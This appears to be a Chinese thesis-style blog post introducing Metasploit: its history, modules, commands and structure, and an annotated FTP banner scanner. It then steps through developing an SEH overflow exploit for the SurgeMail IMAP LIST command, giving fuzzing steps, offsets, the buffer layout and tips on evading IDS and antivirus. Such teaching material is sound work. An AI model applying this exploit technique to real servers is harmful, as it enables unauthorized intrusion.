+网络安全必须是每个组织的关键优先事项。与电子邮件一样，网络是网络攻击的主要媒介之一。网络和DNS服务的使用是所有恶意软件攻击的91%的一部分，电子邮件和网络是99%成功违规的关键部分。<br>
+网络安全威胁是网站和应用程序中的漏洞，或恶意行为者发起的攻击。网络安全威胁旨在破坏组织的安全防御，使黑客和网络犯罪分子能够控制系统，访问数据并窃取有价值的资源。常见的 网络 安全威胁包括恶意软件、勒索软件、跨站点脚本 （XSS）、SQL 注入、网络钓鱼、拒绝服务等。<br>
+1.1.2 	网络安全发展现状<br>
+强大的网络安全产业实力是保障我国网络空间安全的根本和基石。近年来，习近平总书记多次就网络安全产业作出重要指示，强调“要坚持网络安全教育、技术、产业融合发展，形成人才培养、技术创新、产业发展的良性生态”，为网络安全事业高质量发展指明方向，并提供根本遵循。为护航制造强国、网络强国及数字中国建设，产业各界共同努力，推动网络安全产业发展进入“快车道”。2020年我国网络安全产业规模较2019年增长10.6%，企业发展态势总体良好，技术创新高度活跃，生态建设不断完善，综合实力显著增强，为保障国家网络空间安全做出重要贡献。<br>
+在“十四五”的开局之年，网络安全成为国家安全体系能力建设的重要方向。近一年制度建设中，我国不断强化法律法规和标准规范的引导作用，积极培育促进新技术新应用落地，夯实关键信息基础设施安全保障，增强自主创新能力，建设各方面齐抓共管、共治共建的网络安全新生态。<br>
+近年来，我国充分发挥立法的引领和推动作用，逐步完善网络安全顶层设计。一是在推进网络安全法制建设方面取得重大进展。2021年6月，我国数据安全领域的基础性法律《数据安全法》正式发布，并于2021年9月1日起施行，数据分类分级保护、风险评估、安全审查等相关工作机制也将逐步出台。2021年8月，《关键信息基础设施安全保护条例》、《个人信息保护法》相继审议通过，推动开启我国关键信息基础设施保护、个人信息立法保护的新格局，为产业发展指明方向。随着相关制度逐步完善，以数据要素赋能的“双循环”新发展格局将全面展开，产业或将迎来更为广阔的数字化发展红利。此外，《数据安全管理条例》《商用密码管理条例》已列入《国务院2021年度立法工作计划》行政法规制修订名单。二是将网络安全作为未来中国发展建设工作的重点之一。2021年3月，我国发布《中华人民共和国国民经济和社会发展第十四个五年规划和2035年远景目标纲要》，共提及“网络安全”14次，涉及数字经济、数字生态、国家安全、能源资源安全等多个领域，提出了网络安全新发展的重点思路和重点工作，为网络安全产业健康发展提出了政策保障和创新思路。<br>
+1.2 	目前网络安全工具的现状和趋势<br>
+工欲善其事，必先利其器。既然如今已经有了更为便捷、快速的渗透测试工具，这对现代渗透测试工作者无疑是有很大的帮助的。了解国内国外网络安全工具的使用现状和趋势，是进一步研究和开展网络安全工作所必须去做的。<br>
+由于语言上的障碍，国内的网络安全工作人员在选择网络安全工具时会更多的取决于一款网络安全工具是否有汉化的版本。在网络安全工具的使用中也基本脱离于工具的官网论坛，这进而导致了国内外的网络安全工作者在对网络安全工具的选用上存在着不小的差异，尤其是在工作中，国外的网络安全工作者往往会采用“操作系统+渗透测试框架+网络安全工具”的体系进行渗透测试，反观国内的网络安全工作者大多直接选用“操作系统+网络安全工具”这一体系进行渗透测试。“渗透测试框架”的选用成为了国内外网络安全工作人员最大的差异。<br>
+来自世界各地超过700名安全专家参与了一位国外信息安全专家发起了一项渗透测试工具在线调查。其中渗透测试时使用的操作系统，Kali Linux最受欢迎（41%），Windows（19%）和BackTrack（19%）次之。这一点在国内外并没有什么差异。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325120024.png" alt="" loading="lazy"><br>
+图1.1各渗透测试操作系统使用率调查</p>
+<p>而在最常使用的渗透测试框架选用上，Metaspoit以82%遥遥领先：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325125299.png" alt="" loading="lazy"><br>
+图1.2各渗透测试框架使用率调查</p>
+<p>以此可以看出，国内外网络安全工作者的差异主要集中在是否使用Metasploit。<br>
+1.3 	Metasploit框架的现状和趋势<br>
+Metasploit Framework（MSF） 远不止是漏洞利用的集合，它还是一个坚实的框架，可以在此基础上进行构建并轻松自定义以满足实际需求。这使得使用者可以专注于特别的目标环境，而不必重新搭建框架。MSF被认为是当今安全专业人员免费提供的最有用的安全审核工具之一。从广泛的商业级漏洞利用和广泛的漏洞利用开发环境，一直到网络信息收集工具和网络漏洞插件，Metasploit框架提供了一个真正令人印象深刻的工作环境。<br>
+Metasploit 是一个工具，经常被专业渗透测试人员用来在计算机系统上进行测试和审计。Metasploit又不仅仅是一个工具软件，它是为自动化地实施经典的、常规的，或复杂新颖的攻击提供基础设施支持的一个完整的框架平台。它使得你可以将精力集中在渗透测试过程中那些独特的方面上，以及如何识别信息安全计划的弱点上。<br>
+Metasploit最初是由HD Moore所开发和孕育的，当时HD只是一个安全公司的雇员，当他意识到他的绝大多数时间是在用来验证和处理那些公开发布的渗透代码的时候，他便开始为编写和开发渗透代码构建一个灵活且可维护的框架平台。2003年10月HD发布了他的第一个基于Perl语言的Metasploit版本，当时一共集成了11个渗透攻击模块。HD于2004年4月发布了完全重写的Metasploit 2.0，这个版本包含了19个渗透攻击模块和超过27个攻击载荷。在这次发布之后不久，Matt Miller(Skape)加入了Metasploit开发团队，随着项目逐步获得关注，Metasploit框架也获得了来自信息安全社区的大量代码贡献，并且很快成为了一个渗透测试与攻击的必备软件。<br>
+Metasploit作为使用最广泛的渗透测试框架之一，从各类企业到执法机构都能看到它的身影。Metasploit包含了1500多个模块，所涉及的功能涵盖了渗透测试的各个阶段，渗透测试工程师利用这些模块可以轻松完成渗透测试工作。Metasploit不仅提供了全面、有效的渗透测试方法，同时还是一个开源框架，提供了广泛的功能，例如新漏洞的开发与各种任务的自动化，从而减少了大量的人工工作，也节省了大量的时间。<br>
+在众多的网络安全工具之中，Metasploit框架跻身信息安全职业者们最广泛使用的工具软件行列已经相当长的时间了，但是，除了源码本身和在博客上的一些评论之外，国内有价值的文档却一直非常少。无论是出版的关于Metasploit的书籍还是网络上的博客，都很少细致的讲解Metasploit框架的使用。这种状态在近几年有所改观，但大多涉及的方面都还是利用Metasploit框架自带的Payloads以及安全社区发布的攻击模块进行渗透测试以及攻击复现。鲜有关于利用Metasploit框架进行漏洞利用模块开发的文章。而在国外的Metasploit论坛里，每天都要很多网络安全从业人员提交大量的基于Metasploit框架开发的模块，不断的扩充着Metasploit的武器库，集多种功能于一体，并不断优化，以适应发展迅捷的网络空间环境，应对不断出现的各种网络犯罪手段。<br>
+第二章  	Metasploit基础<br>
+2.1 	Metasploit简介<br>
+Metasploit是一款开源的渗透测试框架平台，到目前为止，Msf已经内置了数千个已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写，这使得使用者能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。<br>
+2.1.1 	Metasploit版本<br>
+Metasploit Framework是渗透测试工程师和安全研究人员使用最广泛框架，适合自行扩展框架和开发渗透测试模块，如漏洞利用脚本，攻击载荷等。表2.1是对Metasploit各版本的介绍。<br>
+表2.1 Metasploit各版本介绍<br>
+版本	简介	适用对象<br>
+Metasploit Pro	专业版，提供大量功能有网络扫描，渗透模块，自动化渗透工具适合专业的高级的大型渗透测试项目	专业的安全企业及安全团队<br>
+Metasploit Express	企业版，包含智能化渗透密码的自动化暴力破解等功能	适合中小型企业的安全团队<br>
+Metasploit Community	精简版,具备企业版的小部分功能	适合小企业和学生<br>
+Metasploit Framework	Framework版，在命令行下运行版本，所有任务都在命令行下完成	适合开发人员和安全研究人员</p>
+<p>Metasploit Framework 在用户接口设计方面主要包括以下部分：<br>
+1）图形用户界面(GUI)：图形化模式下，使用鼠标点击即可完成任务，图形界面提供了友好的操作模式和简单便捷的漏洞管理模式，如典型的Armitage就是一个充满黑客风的GUI。<br>
+2）控制台界面(console)：提供了统一的工作方式管理Metasploit的所有功能，也是最流行的方式和最稳定的控制方法之一。<br>
+3）命令行界面：是功能最全的界面支持对所有渗透模块的操作，甚至支持与系统shell编程调用。<br>
+2.1.2 	Metasploit模块<br>
+Metasploit框架下包含多种模块，并且支持使用者自行开发模块脚本等，下面介绍几种常用的主要模块。</p>
+<ol>
+<li>渗透模块(exploit)：该模块下包含大量的漏洞利用脚本，可针对特定漏洞选择利用脚本，发起对漏洞的利用。</li>
+<li>攻击载荷模块(payload)：该模块包含大量获得操作系统访问权限或者系统shell的代码，通常由exploit模块挂载特定的攻击载荷，实现利用漏洞—&gt;获取shell的目的。</li>
+<li>编码模块(encoder)：该模块包含大量的编码混淆脚本，通常利用该模块下的特定脚本对payload进行编码，以绕过杀毒软件或防火墙。</li>
+<li>辅助模块(auxlary):该模块包含大量扫描探测脚本，通常利用该模块下面的各种脚本进行扫描、探测、识别等。<br>
+2.1.3 	Metasploit基本命令<br>
+表2.2 Metasploit基本命令介绍<br>
+命令	用途	示例<br>
+use [auxiliary/exploit/payload/encouder]	选择使用某一具体模块	msf&gt;use exploit/unix/ftp/ftpd_backdoor<br>
+show [auxiliary/exploits/payloads/encouders/options]	列出特定类别有哪些具体模块，或者显示具体模块的设置信息	msf&gt;show exploits<br>
+msf&gt; show options<br>
+set [options/payload]	给某模块的参数赋值	set LPORT 3306<br>
+set [options/payload]	给全局参数赋值	set RHOST 192.168.1.2<br>
+run	启动某模块(通常是auxiliray块)	run<br>
+exploit	启动一个exploit模块	exploit<br>
+back	取消已选择的模块，回到上一级命令窗口	back<br>
+info	列出模块相关信息	info<br>
+search	按关键字搜索模块	search 08067<br>
+check	检查或扫描目标是否存在漏洞	check<br>
+sessions	列出当前可用会话	sessions -l</li>
+</ol>
+<p>2.2 	Metasploit结构分析<br>
+在上文有介绍到Msf有很多功能模块，如exploit、encoder、payload、auxilary，这些模块下有大量脚本，并且Msf支持自行开发这些模块下的脚本或加载其他自定义模块使用。接下来就用上面介绍的Ruby基础知识常识自己开发一个Metasploit模块。<br>
+2.2.1 	Metasploit结构解析<br>
+MSF的框架结构如图2.1所示。主要分为4个组成部分：分别是基础库文件、功能程序及交互接口、模块及扩展脚本、插件及外部安全工具。各组成部分说明及功能简介如表2.3所示。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325141963.png" alt="" loading="lazy"><br>
+图2.1 Metasploit框架结构</p>
+<p>表2.3 框架组成介绍<br>
+组成部分	组成部分作用说明	组成部分简介<br>
+基础库文件	基础库文件是Msf核心组成部分，它负责支持、调度、解释各类功能。有Ruby扩展(Rex)、MSF核心、MSF基础3部分。	Ruby扩展：处理所有核心功能，如网络套接字，网络连接，格式化，模块解释等。<br>
+MSF核心：框架自身程序代码、负责模块管理、插件管理、会话管理、事件调度、数据存储等Msf框架的核心功能。<br>
+MSF基础：为模块和插件提供编程接口，负责配置功能、日志功能等。<br>
+模块及<br>
+扩展脚本	Msf模块及扩展脚本是完成实际业务功能的主要代码，按照业务功能进行了多个分类，是实际渗透测试中使用的各功能的具体实现。	实现扫描、漏洞利用、编码、攻击载荷生产等各类业务。<br>
+功能程序及交互接口	该组成部分主要分为两类，一类是与Msf框架进行交互的用户接口如msfconsole、msfgui、msfapi等；一类是通过系统命令行单独调用Msf某项功能的程序，如使用Msfvenom生成木马，或使用Msfencode进行编码等。	为用户提供全部业务功能或部分业务功能的访问接口。<br>
+插件和<br>
+外部工具	外部插件和工具主要提供与外部工具的调用功能，如调用Nmap工具进行扫描或直接使用Nmap工具扫描报告，或调用Nessus扫描工具等	支持msf调用其他工具的功能。<br>
+2.2.2 	框架文件结构<br>
+<img src="https://abraxasfever.github.io//post-images/1726325150704.png" alt="" loading="lazy"><br>
+图2.2 Metasploit中文件结构</p>
+<p>在Metasploit中，Lib目录、Moudules目录等是和模块开发相关的重要目录，如表2.4所示：<br>
+表2.4 Metasploit重点文件目录<br>
+目录	简介<br>
+Lib	Metasploit的核心库文件，包含了msf模块开发所需的全部重压库文件<br>
+Moudules	包括各类模块的及各类模块下的各种功能脚本，如auxiliary、Exploits、Payloads、Encoders等等<br>
+Tools	包括了辅助渗透测试时使用的各类工具<br>
+Plugins	扩展msf功能的插件，包括openvas、Nessus等使用load载入的工具<br>
+Scripts	包括meterpreter、Shell等在内的各类拓展脚本</p>
+<p>2.3 	Metasploit现有模块解析<br>
+Metasploit在auxiliary模块目录下提供了名为example.rb的简单的模块示例代码(目录与Msf在操作系统的安装位置有关，Kali的默认目录在/usr/Share/Metasploit-Framework/Modules/Auxiliary目)，先对该模块做简单解析后再分析一个具有实际业务功能的模块。<br>
+2.4 	example.rb模块分析<br>
+example.rb是一个很具有参考性的模块，通过了解这个示例代码可以很容易的明白Metasploit框架下一个模块的格式，便于进行下一步的模块开发。<br>
+2.4.1 	example.rb模块的主要功能<br>
+该模块主体功能是显示当前所运行的Action是什么，另外有info显示模块信息，set action设置运行action功能。<br>
+2.4.2 	example.rb模块代码分析<br>
+example.rb模块提供的代码详见附录，添加了详细的注释解释代码各个功能和作用。<br>
+其中第一行Require导入了'Msf/Core'内的大量库文件 ,MSF核心提供了编程接口,模块中大量函数或方法都从库文件中调用，库文件如图2.3所示。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325157397.png" alt="" loading="lazy"><br>
+图2.3 Metasploit库文件列表</p>
+<p>2.5 	ftp_version.rb解析<br>
+ftp_version是Metasploit自带的一个用于收集版本信息的模块，用于使用FTP传输协议获取目标系统信息。<br>
+2.5.1 	模块功能<br>
+该模块的主要功能是探测目标设备的FTP版本信息。该程序具备如下功能：</p>
+<ol>
+<li>显示模块信息；</li>
+<li>设置目标设备IP和端口；</li>
+<li>向指定的IP和端口发起连接；</li>
+<li>显示和保存返回的banner信息。<br>
+2.5.2 	功能实现代码解析<br>
+该模块是Msf模块中比较简单的模块，主要功能都是调用Msf库的现有库文件内函数来实现，接下来通过分块和在源码中添加注释的方式解析代码功能。<br>
+第一部分：</li>
+</ol>
+<h1 id="this-module-requires-metasploit-httpsmetasploitcomdownload">This module requires Metasploit: https://metasploit.com/download</h1>
+<h1 id="current-source-httpsgithubcomrapid7metasploit-framework">Current source: https://github.com/rapid7/metasploit-framework</h1>
+<p>第一块说明：模块通常以注释开始，注释可以放置一些信息，比如此模块的注释就是说明这个模块需要使用Metasploit运行，并提供下载地址<br>
+第二部分：<br>
+class MetasploitModule &lt; Msf::Auxiliary    #1<br>
+include Msf::Exploit::Remote::Ftp    #2<br>
+include Msf::Auxiliary::Scanner<br>
+include Msf::Auxiliary::Report<br>
+第二部分说明：<br>
+#1.模块一般使用class声明，并进行简单的分类，此模块在分类上属于Auxiliary。#2.模块调用了msf库里的一些函数，这些函数所在的库文件必须通过include声明，如果没有include Msf::Exploit::Remote::Ftp这一行，下面代码中调用connect()函数则无法被程序识别。<br>
+第三部分：<br>
+def initialize                       #1<br>
+super(<br>
+'Name'        =&gt; 'FTP Version Scanner',<br>
+'Description' =&gt; 'Detect FTP Version.',<br>
+'Author'      =&gt; 'hdm',<br>
+'License'     =&gt; MSF_LICENSE<br>
+)<br>
+register_options(        #2<br>
+[Opt::RPORT(21),])<br>
+end<br>
+第三部分说明:<br>
+Ruby的初始化函数，通过def调用，使用super()初始化父类的指定信息，如该模块初始化Name、Description、Author、Licence等信息，当msf使用info时会显示这几个被初始化的参数和值。#2.此模块还通过register_options()函数初始化了一个设置，即ftp默认端口21。<br>
+第四部分：<br>
+def run_host(target_host)    #1<br>
+begin<br>
+res = connect(true, false)    #2<br>
+if(banner)<br>
+banner_sanitized = Rex::Text.to_hex_ascii(self.banner.to_s) #banner格式转换<br>
+print_good(&quot;FTP Banner: '#{banner_sanitized}'&quot;)  #打印输出banner<br>
+report_service(:host =&gt; rhost, :port =&gt; rport, :name =&gt; &quot;ftp&quot;, :info =&gt; banner_sanitized)        #3<br>
+end           #对应if结尾<br>
+disconnect    #断开连接<br>
+rescue ::Interrupt #中断和错误处理<br>
+raise ¥!       #中断和错误处理<br>
+rescue ::Rex::ConnectionError, ::IOError #中断和错误处理<br>
+end     #对应begin结尾<br>
+end     #对应class结尾<br>
+第四部分说明：<br>
+1.run_host()是从include Msf::Auxiliary::Scanner中调用的函数，并使用def在本模块声明，它位于/lib/msf/core/auxiliary/scanner.rb，它的功能是对目标主机运行一次函数主要内容，它在本模块就是运行begin后面的connect()以连接目标设备的ftp服务、通过report()保存数据等。<br>
+2.connect()则是通过第二块代码include Msf::Exploit::Remote::Ftp调用/lib/msf/core/exploit/ftp.rb内的函数，它的功能是建立与ftp端口的连接，并获取端口响应信息(banner)，保存到名为banner的属性中，下文会给出ftp.rb的源码，并简单解析connect是如何实现的。<br>
+3.report_service()则是通过include Msf::Auxiliary::Report调用/lib/msf/core/auxiliary/report.rb内的函数，功能是：在msf与数据库连接正常的情况下把扫描目标ip、端口、服务名称(ftp)、banner、workspace名称(msf的工作目录)、task名称存储在数据库。<br>
+把ftp_version模块分解为块逐条说明了各代码的功能，其中还connet()函数和report_service()函数调用了msf库里的函数，下面再解析一下这两个函数的实现方式，首先是connect()函数，打开/lib/msf/core/exploit/ftp.rb文件即可查看源码，connect()函数初始化了一个连接目标ftp的进程，上面的模块使用global=ture和verbose=false参数值，自动化连接目标和保存参数值到banner参数。<br>
+接下来对report_service()函数的代码简单的分析一下，打开/lib/msf/core/auxiliary/report.rb可以看到源代码，report_service()通过接收参数保存至opts字典内，然后将opts字典存储至msf数据库，其中关于report_service()代码如下：<br>
+def report_service(opts={})  #声明report_service函数，接收一个缺省为空的字典<br>
+return if not db    #检查数据库状态，如果连接不成功则直接返回。<br>
+opts = {            #拼接字典并再赋值给opts<br>
+:workspace =&gt; myworkspace,<br>
+:task =&gt; mytask<br>
+}.merge(opts)<br>
+framework.db.report_service(opts)    #存储字典至数据库<br>
+end<br>
+以上对ftp_version模块的代码进行了解析和介绍，主要用于显示设备指定端口响应的banne信息。<br>
+第三章  	基于Metasploit的模块开发<br>
+3.1 	模块开发目标<br>
+由于Metasploit中当前可用的漏洞利用数量庞大，因此可以在漏洞利用开发期间简单地编辑该模块来达到目的，模块开发目标应尽量简洁且符合以下要求：</p>
+<ol>
+<li>尽可能多的依托于Metasploit框架。</li>
+<li>利用并依赖Rex 协议库。</li>
+<li>大量使用可用的已有模块和Metasploit提供的插件。<br>
+在对漏洞利用模块进行开发时主要要注意以下几点：</li>
+<li>漏洞利用模块的可靠性。在模块代码中声明的每一个坏字符都应当准确，还有就是需要确定Payload所需的字符串长度，以避免溢出。</li>
+<li>漏洞利用应尽可能利用随机性。随机化有助于漏洞利用的Payload绕过IDS，IPS，并且还可以作为极佳的可靠性测试。在进行填充的时候，使用Metasploit自带的Rex：：Text.rand_text_可以更好的实现一个很好的随机化。在生成Payload后，选择合适的编码器对其进行随机化，还需要对空指令进行随机化。如果可能的话，对编码器也进行随机化。</li>
+<li>漏洞利用模块的代码也应具备可读性。所有Metasploit模块都应具有一致的缩进结构。在使用Mixins时，尤其需要保持模块名称一致以便后期进行维护。</li>
+<li>漏洞利用的模块应该具备可用性和可靠性，写成的漏洞利用模块应当可被使用于更多的目标。<br>
+3.2 	漏洞利用模块代码格式<br>
+Metasploit 中漏洞利用模块的格式类似于辅助模块的格式，作为一个漏洞利用模块，需要一个payload代码块。没有payload的攻击只能是一个辅助模块。除此以外，还需要使用 exploit() 和 check()。<br>
+从安全性的角度出发，应尽可能在漏洞利用模块中定义一个名为 check() 的方法。Check() 方法用于验证除Payloads之外的所有项。执行Check的目的是确定目标是否易受攻击。并且最后返回预设的 Check 值。<br>
+Check() 的返回值为：<br>
+	CheckCode::Safe – 没有可利用漏洞<br>
+	CheckCode::Detected – 检测到服务<br>
+	CheckCode::Appears – 易受攻击的<br>
+	CheckCode::Vulnerable –  已确认<br>
+	CheckCode::Unsupported – 此模块不支持检查<br>
+结合Check值，可以更好的检查漏洞利用模块各个部分的运行情况。<br>
+3.3 	Mixins<br>
+Mixins是Ruby语言中应用广泛的一种机制，其作用是将一些功能放置到模块中，并使得Ruby这种单继承语言具备多继承的能力。在漏洞利用代码模块中使用Mixins，有助于调用该漏洞利用代码所需的不同函数。Mixins提供给使用者在不同的模块之间进行共享代码功能，以减少不同模块之间存在的代码重复。<br>
+3.3.1 	Exploit::Remote::Tcp<br>
+lib/msf/core/exploit/tcp.rb<br>
+提供 TCP 选项和方法。<br>
+	定义 RHOST、RPORT、ConnectTimeout<br>
+	提供 connect(), disconnect()<br>
+	创建 self.sock 作为全局套接字<br>
+	提供 SSL、代理、CPORT、CHOST<br>
+	通过小段发送进行规避<br>
+	将用户选项公开为方法 – rhost() rport() ssl()<br>
+3.3.2 	Exploit::Remote::DCERPC<br>
+lib/msf/core/exploit/dcerpc.rb<br>
+继承自 TCP 混合，并具有以下方法和选项：<br>
+	dcerpc_handle()<br>
+	dcerpc_bind()<br>
+	dcerpc_call()<br>
+支持具有多上下文绑定请求和分段 DCERPC 调用的 IPS 规避方法。<br>
+3.3.3 	Exploit::Remote::SMB<br>
+lib/msf/core/exploit/smb.rb<br>
+继承自 TCP 混合，并提供以下方法和选项：<br>
+	smb_login()<br>
+	smb_create()<br>
+	smb_peer_os()<br>
+	提供 SMBUser、SMBPass 和 SMBDomain 的选项<br>
+	公开 IPS 规避方法，例如：SMB：:p ipe_evasion、SMB：:p ad_data_level、SMB：：file_data_level<br>
+3.3.4 	Exploit::Remote::BruteTargets<br>
+这个模块有 2 个重要的源文件。<br>
+lib/msf/core/exploit/brutetargets.rb<br>
+重载 exploit() 方法：<br>
+	每个目标的调用exploit_target（目标）<br>
+	方便轻松进行目标迭代<br>
+lib/msf/core/exploit/brute.rb<br>
+重载利用漏洞的方法：<br>
+	为每个步进调用 brute_exploit()<br>
+	轻松暴力破解和地址范围<br>
+除了上述列出的Mixin，在创建漏洞利用时，还有更多可供使用。比如：捕获（嗅探网络数据包）、MSSQL（与 Microsoft SQL 服务器交谈）、内核模式、SHE（结构化异常处理）、EggHunter（内存搜索）等。<br>
+综上所述，Mixins用于在Ruby这种单继承语言中提供多继承机制，可以根据实际需要在任意模块中调用不同的功能。例如，如果需要在漏洞利用模块中建立TCP连接，并不需要专门为其定义一个完整的函数，可以简单地在模块中调用Exploit::Remote::TCP这一Mixin模块，就可以使用其中提供的各种功能。<br>
+3.4 	漏洞利用模块设计<br>
+3.4.1 	Fuzz测试器介绍<br>
+Fuzz测试器是专业安全人员用来向程序输入特定数据的工具。常见的Fuzz测试器能够测试应用程序缓冲区溢出、格式无效字符串、目录遍历攻击、命令执行漏洞、SQL 注入、XSS 等漏洞。<br>
+由于Metasploit框架为专业安全人员提供了一套非常完整的库，用于许多网络协议和数据操作，因此Metasploit是快速开发简单Fuzz测试器的良好选择。<br>
+在Metasploit中Rex：：Text模块提供了许多方便的功能，例如：<br>
+	缓冲区转换<br>
+	编码（html、url 等）<br>
+	校验和<br>
+	生成随机字符串<br>
+最后一点对于编写简单的Fuzz测试器非常有帮助。这将有助于编写Fuzz测试器工具，例如简单的URLFuzz测试器或完整的网络Fuzz测试器。<br>
+Metasploit最强大的方面之一是通过重用现有代码进行更改和创建新的工具是极其简单的。正如这个非常简单的Fuzz测试器代码所示，对现有的Metasploit模块进行一些小的修改便可以得到一个新的Fuzz测试器模块。这些小修改导致这个模块在执行的时候将不断增加的长度进行测试，直到长度适用于 Windows 的 3Com TFTP 服务，从而导致 EIP 被覆盖。<br>
+运行测试：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325221444.jpg" alt="" loading="lazy"><br>
+图3.3简单的TFTP Fuzz测试器：覆盖EIP</li>
+</ol>
+<p>新的Fuzz测试工具按预期工作。虽然这在表面上看起来很简单，但要考虑的一件事是这提供了可重用的代码。在这个示例中，定义了Payload结构，节省了时间，并且可以直接进行Fuzz测试，而不需要研究TFTP协议。这是非常强大的功能，这也是Metasploit框架的一个隐藏的优势。<br>
+3.4.2 	Fuzz测试器设计<br>
+以一个IMAP 邮件服务器的Fuzz测试器为范例，该服务器已知容易受到缓冲区溢出攻击。接下来从一个IMAP Fuzz测试器开始编写漏洞利用程序。<br>
+易受攻击的命令是IMAP LIST，于是需要有效的凭据才能利用该应用程序进行漏洞利用。正如之前所看到的，MSF 中存在的大型“库”可以快速编写任何网络协议的脚本，IMAP 协议也不例外。包括 Msf：：Exploit：：Remote：：Imap 将节省大量时间。实际上，连接到IMAP服务器并执行模糊易受攻击的命令所需的身份验证步骤只是单行命令行的问题。 IMAP Fuzz测试器的代码详见附录。<br>
+其实一个Fuzz测试器的结构很简单，在这个IMAP Fuzz测试器中，先引用IMAP和Dos类，以使用IMAP的功能。然后准备一个Fuzz测试的字符串，这个字符串便是要通过Fuzz测试器发送给服务器的畸形数据，这里被设置为一个长度为1024字节的字母和数字混合的随机字符串。然后Fuzz测试器连接并且登录到远程服务器上。Metasploit框架会针对漏洞，用随机字符串出一个恶意请求发送给远程服务。<br>
+每次用户调用从 Msfconsole 运行时，代码都会被执行。在 Run() 中的 While 循环中，连接到 Imap 服务器，并通过从 Msf：：Exploit：：Remote：：Imap 导入的函数 Connect_Login() 进行身份验证。然后，调用函数 Fuzz_Str()，该函数生成一个大小可变的字母数字缓冲区，该缓冲区将通过raw_Send_Recv函数作为 List Imap 命令的参数发送。<br>
+测试 IMAP Fuzz测试器工具：<br>
+现在已准备好对易受攻击的 IMAP 服务器进行模糊处理。从 ImmunityDebugger 添加 surgemail.exe流程，并开始Fuzz测试会话：</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726325226441.png" alt="" loading="lazy"><br>
+图3.4 Fuzz测试会话</p>
+<p>MSF 反馈的信息，IMAP 服务器可能已经崩溃，Immunity Debugger 确认了这一点，如下图所示：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325231790.png" alt="" loading="lazy"><br>
+图3.5 模糊处理 IMAP 服务器</p>
+<p>这个Fuzz测试器可以覆盖EIP，使ESP成为唯一指向控制下的内存位置的寄存器（返回地址后4个字节）。以此可以继续重建缓冲区（模糊 = “A”*1004 + “B”*4 + “C”*4），以确认执行流可通过 JMP ESP 地址作为 ret 重定向。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325236964.png" alt="" loading="lazy"><br>
+图3.6使用调试器查找漏洞利用</p>
+<p>现在需要确定正确的偏移量，以便执行代码。幸运的是，Metasploit提供了两个非常有用的实用程序：pattern_create.rb和pattern_offset.rb。这两个脚本都位于Metasploit的工具目录中。通过运行pattern_create.rb，脚本将生成一个由独特模式组成的字符串，可以使用它来替换“A”序列。<br>
+漏洞利用代码：<br>
+root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 11000<br>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A<br>
+c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2<br>
+Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5...<br>
+在成功覆盖EIP或SEH(或目标的任何寄存器)后，需要记下寄存器中包含的值，并将此值提供给pattern_offset.rb，以确定该值在随机字符串中的哪个点出现。<br>
+使用 Rex：：Text.pattern_create() 直接从Fuzz测试器调用底层 API，而不是pattern_create.rb 调用命令行。<br>
+调用pattern_create函数，该函数最多需要两个参数，要创建的缓冲区的大小和可选的第二个参数，以便对缓冲区的内容进行一些控制。为了满足需要，将调用该函数，并将Fuzz变量替换为 fuzzed = Rex：：Text.pattern_create（11000）。这导致SEH 被 0x684E3368 覆盖，并且根据 pattern_offset.rb 返回的值，可以确定覆盖异常处理程序的字节是接下来的四个字节 10361、10362、10363、10364。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325294389.png" alt="" loading="lazy"><br>
+图3.7 调试漏洞利用代码</p>
+<p>由于在 SEH 溢出攻击中经常发生，现在需要找到一个 POP POP RET地址，以便将执行流重定向到缓冲区。但是，在surgemail中搜索合适的返回地址.exe，显然会遇到以前遇到的问题，所有地址都有一个空字节。<br>
+但是，如果尝试部分覆盖的形式，溢出SEH，只有返回地址的最低3个有效字节。不同之处在于，可以按照如下模式将shellcode放入缓冲区的第一部分：<br>
+| NOPSLED | SHELLCODE | NEARJMP | SHORTJMP | RET (3 Bytes) |<br>
+POP POP RET 会在 RET 之前重定向4个字节，放置一个简短的 JMP，返回5个字节。然后，将有一个靠近后部的JMP。<br>
+这对于EIP和ESP的部分覆盖是不可能的，因为由于堆栈排列，ESP在RET之后是四个字节。如果对EIP进行部分覆盖，ESP将处于无法控制的区域。接下来，就可以编写漏洞利用模块获取shell。<br>
+3.4.3 	漏洞利用模块编写<br>
+编写漏洞并将其保存到windows/imap/surgemail_list.rb。代码详见附录中IMAP漏洞利用模块代码。<br>
+在此漏洞利用代码中要注意的事情如下：</p>
+<ol>
+<li>space定义了Shellcode的最大空间（空间 = &gt; 10351），并将 DisableNops 功能设置为禁用自动Shellcode填充，将自行填充Payloads。</li>
+<li>将默认编码器设置为 AlphanumMixed，因为 IMAP 协议的性质。</li>
+<li>定义了3字节 POP POP RET 返回地址，然后通过 target.ret 变量引用该地址。</li>
+<li>定义了一个检查函数，该函数可以检查IMAP服务器横幅以识别易受攻击的服务器，以及显然是完成大部分工作的漏洞利用函数。<br>
+3.4.4 	漏洞利用模块测试<br>
+一些选项已经从之前的会话中配置。检查服务器版本：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325301604.png" alt="" loading="lazy"><br>
+图3.8 检查服务器版本会话</li>
+</ol>
+<p>将调试器附加到 surgemail.exe过程，以查看覆盖 SEH 的偏移量是否正确：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325305948.png" alt="" loading="lazy"><br>
+图3.9测试漏洞利用模块</p>
+<p>偏移是正确的，现在可以在返回地址处设置一个断点：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325310599.png" alt="" loading="lazy"><br>
+图3.10测试漏洞利用模块，设置断点</p>
